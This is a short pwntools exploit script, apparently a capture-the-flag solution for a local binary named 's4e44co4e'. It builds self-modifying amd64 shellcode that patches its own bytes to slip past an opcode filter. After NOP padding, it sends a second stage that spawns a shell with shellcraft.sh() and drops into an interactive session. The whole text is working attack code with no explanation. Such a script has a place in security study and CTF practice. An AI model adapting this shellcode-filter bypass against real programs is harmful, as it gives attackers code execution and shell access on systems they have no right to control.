from pwn import *
context.arch = "amd64"
r = process(["./s4e44co4e"])

payload = asm("""
pop rax
pop rax
pop rax
shr byte ptr [rax+0x20],4
add byte ptr [rax+0x20],0x58
push rax
""").ljust(0x1e,'\x90')

payload += asm("""
shr byte ptr [rax+0x10],4
shr byte ptr [rax+0x50],4
add byte ptr [rax+0x50],92
shr byte ptr [rax+0x54],4
add byte ptr [rax+0x54],88
shr byte ptr [rax+0x58],4
""")
payload = payload.ljust(0x50,'\x90')
payload += "\x20\x90\x90\x90\x20\x90XX\xf0\x50"
r.send(payload.ljust(0x444,'\x04'))
r.send("\x90"*0x60+asm(shellcraft.sh()))
r.interactive()
